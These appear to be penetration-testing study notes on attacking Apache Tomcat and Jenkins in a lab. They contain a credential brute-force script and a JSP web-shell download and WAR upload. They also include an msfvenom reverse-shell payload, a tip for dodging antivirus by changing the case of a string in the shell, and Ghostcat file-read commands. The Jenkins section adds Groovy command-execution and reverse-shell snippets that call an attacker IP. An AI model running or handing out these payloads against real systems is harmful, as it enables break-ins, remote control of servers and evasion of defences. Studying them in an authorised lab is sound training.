## 1- Tomcat Overview
Apache Tomcat is an open-source Java web server used to run Servlets and JSP apps.  
It’s popular in Java frameworks like Spring and tools like Gradle.

- 220k+ live Tomcat websites
- 904k+ total historical Tomcat websites
- Used by Alibaba, USPTO, Red Cross, LA Times
- Often found internally during pentests; many instances use weak/default creds
#### Discovery / Footprinting
- Tomcat can be identified through HTTP responses:
```bash
curl -i http://www.site.com | grep Tomcat # Shows: Apache Tomcat 9 (9.0.30)
```
- The **Server** header or 404 error pages often reveal Tomcat version
![[Pasted image 20251203134917.png]]

- If hidden, accessing `/docs` can expose version info
```shell
curl -s http://site.com/docs/ | grep Tomcat # Shows: Apache Tomcat 9 (9.0.30)
```


**Default Tomcat Directory Structure:**
This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.:
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```

==`webapps/` is a directory that contains _multiple web applications_. Each app is a folder: `webapps/manager`, `webapps/ROOT`, `webapps/customapp`, etc.==
==**Each app folder** should contain its own `WEB-INF/` (and often `META-INF/`, `index.jsp`, etc.). So you will see `webapps/manager/WEB-INF`, `webapps/ROOT/WEB-INF`, and `webapps/customapp/WEB-INF` — that’s normal.==

folders :
- **bin** → startup scripts and binaries
- **conf** → configs (important: `tomcat-users.xml`, `web.xml`)
- **lib** → JAR files
- **logs/temp** → logs and temporary data
- **webapps** → deployed applications
- **work** → runtime cache

**Structure of Applications in webapps**
Each app usually contains:
- `index.jsp`
- `META-INF/context.xml`
- `WEB-INF/web.xml` ← deployment descriptor
- `WEB-INF/classes` ← compiled servlet `.class` files
- `WEB-INF/lib` ← app-specific JARs
- `jsp/` ← JSP pages (similar to PHP functionality)

**web.xml Importance:**

```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class   
```
Defines servlets and route mappings.

Here’s an `web.xml` file.
```bash
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app>   
```
A servlet named `AdminServlet` mapped to `/admin`.  
Corresponding class path:  
`WEB-INF/classes/com/inlanefreight/api/AdminServlet.class`
The `web.xml` descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (**LFI**) vulnerability



**tomcat-users.xml:** The `tomcat-users.xml` file is used to allow or disallow access to the `/manager` and `host-manager` admin pages.
```xml
!-- user manager can access only manager section -->
<role rolename="manager-gui" />
<user username="tomcat" password="tomcat" roles="manager-gui" />

<!-- user admin can access manager and admin section both -->
<role rolename="admin-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />


</tomcat-users>
```
Roles:
- `manager-gui` → GUI + status
- `manager-script` → API
- `manager-jmx` → JMX proxy
- `manager-status` → status only
we can see that a user `tomcat` with the password `tomcat` has the `manager-gui` role, and a second weak password `admin` is set for the user account `admin`

#### Enumeration
After identifying Tomcat, look for:
- `/manager`
- `/host-manager`
- `/docs`
- `/examples`
 **With Gobuster:**
```shell
gobuster dir -u http://TARGET:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
  # Shows: /docs, /examples, /manager
```

 **Exploitation Path**
If you log in using weak/default creds:
- Access `/manager/html`
- Upload a **WAR file containing a JSP web shell**
- Gain remote code execution on the server

---

## 2- Attacking Tomcat
Focusing on gaining internal access via an exposed Tomcat server. The main target is the `/manager` and `/host-manager` endpoints, which allow WAR upload → RCE. Start by brute-forcing the Tomcat Manager credentials.
#### Tomcat Manager – Login Brute Force
brute-force Tomcat Manager login at `http://www.site.local:8180/manager/html`
- Tool: Metasploit module `auxiliary/scanner/http/tomcat_mgr_login`.
```
msf6> set VHOST web01.inlanefreight.local
msf6> set RPORT 8180
msf6> set STOP_ON_SUCCESS true
msf6> set RHOSTS 10.129.201.58
# show options to verify
```
- Running the module brute-forces default creds.
- Found valid login: **tomcat : admin**.

 **Understanding Tool Usage**
- Using Metasploit does NOT make you a “bad pentester.”
- Key: understand what the module does, and be able to troubleshoot manually.
- You can proxy MSF traffic through Burp:
```
msf6> set PROXIES HTTP:127.0.0.1:8080
msf6> run
```
 Burp shows each credential pair being encoded into Basic Auth headers (`Authorization: Basic <base64>`).


**Python Script Alternative** 
A simple Python script can brute-force the Tomcat Manager using Basic Auth:
```python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```
Run actual brute-force:
```bash
python3 mgr_brute.py \
  -U http://web01.inlanefreight.local:8180/ \
  -P /manager \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```
Result: finds the same valid credentials (`tomcat : admin`).
  

#### Tomcat Manager – WAR File Upload
Once logged in at `/manager/html`, you can upload a `.war` file containing a JSP webshell

Download JSP shell:
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```
Create a WAR:
```
zip -r backup.war cmd.jsp
```
Upload via Manager GUI → App appears as `/backup`.
![[Pasted image 20251203150540.png]]
**Accessing the Shell:** Tomcat extracts the WAR and serves the JSP:
```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
  # uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```


***Using msfvenom to Generate WAR Shell:***
Generate malicious WAR with reverse shell:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
Start listener:
```
nc -lnvp 4443
```
Trigger:
- Visit: `http://target:8180/backup/`
- Shell connects back:
```
uid=1001(tomcat)
```

**Using Relevant Metasploit Module:**
use metasploit `multi/http/tomcat_mgr_upload` module  for Automates credential + WAR upload + shell.


**Lightweight JSP Shell:** [This](https://github.com/SecurityRiskAdvisors/cmd.jsp) JSP web shell is very lightweight (under 1kb) and utilizes a [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded `cmd.jsp` would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).
![[Pasted image 20251203150918.png]]
The web shell as is only gets detected by 2/58 anti-virus vendors.

A simple change such as changing: `FileOutputStream(f);stream.write(m);o="Uploaded:` to `FileOutputStream(f);stream.write(m);o="uPlOaDeD:` in the shell script  results in 0/58 security vendors flagging the `cmd.jsp` file as malicious at the time of writing.

#### CVE-2020-1938 : Ghostcat
A critical **unauthenticated LFI** in Tomcat’s **AJP protocol**.  
Affects all versions **before 9.0.31, 8.5.51, 7.0.100**.

- Cause: Misconfiguration in **AJP (port 8009)**, which proxies requests to Tomcat.
- Impact: Read **any file inside webapps/** (e.g., `WEB-INF/web.xml`).
- Limitation: Cannot read system files like `/etc/passwd`.
**Identifying AJP**
Use Nmap to check ports:
```
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
# 8009/tcp open  ajp13
# 8080/tcp open  Apache Tomcat 9.0.30
```
**Exploiting Ghostcat**
Use the PoC script  The PoC  can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi).to fetch files inside the web root:
```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
   # <?xml version="1.0" encoding="UTF-8"?>..........
```
This dumps the target file’s contents.


---


## 3- Jenkins – Discovery & Enumeration
Jenkins is an open-source automation/CI server written in Java. It runs inside servlet containers like Tomcat and is commonly used for continuous integration and automated builds. Jenkins is widely used and has had several serious vulnerabilities, including unauthenticated RCE.>

Originally named Hudson (2005), renamed Jenkins in 2011. Used by 86k+ companies including Netflix, Facebook, LinkedIn. Supports 300+ plugins

#### Discovery / Footprinting
Jenkins usually runs on port **8080**. Port **50000** is used for master slave communication. Authentication may be local DB, LDAP, Unix users, servlet container, or sometimes **disabled**.
```bash
nmap site.com -p 80880,50000 -A
```
![[Pasted image 20251204152722.png]]
#### Identifying Jenkins
We can fingerprint Jenkins quickly by the telltale login page.
```
http://jenkins.inlanefreight.local:8000/login
```
![[Pasted image 20251204152800.png]]
We may encounter a Jenkins instance that uses weak or default credentials such as `admin:admin` or does not have any type of authentication enabled

---
## 4- Attacking Jenkins
####  Script Console
Once logged into Jenkins (with weak credentials), attackers can use the **Script Console** (`/script`) to run **Groovy** scripts.  
Groovy can execute OS commands, giving full command execution . often as **root/SYSTEM**.

 **Running Linux Commands:** Attackers can execute commands like `id` using Groovy script:
access the ` http://jenkins.site.local:8000/script` directory
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**or with metasploit:**
```bash
msf > use exploit/multi/http/jenkins_script_console
```
**Reverse Shell (Linux):** Groovy can spawn a reverse shell:
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
the start the listener:
```bash
 nc -lvnp 8443
id # uid=0(root) gid=0(root) groups=0(root)
```

 **Windows Command Execution:**
 Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We could run commands on a Windows-based Jenkins install using this snippet:
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

Or use PowerShell reverse shells (e.g., [this](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) Java reverse shell) or Java-based reverse shell payloads.
example:
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Miscellaneous Vulnerabilities
Several Jenkins versions contain **pre-auth (==2.137==)or low-priv RCE flaws (==2.150.2==)**:
##### CVE-2018-1999002 + CVE-2019-1003000

- Allows **pre-auth RCE**
- Bypasses Groovy sandbox protections
- Works on Jenkins **2.137**
##### Jenkins 2.150.2 Node.js Exploit

- Users with **JOB creation** + **BUILD** can execute Node.js code 
- If anonymous users are enabled, exploit works without login (it already have the **JOB creation** + **BUILD** priv)
- Works on Jenkins **2.150.2**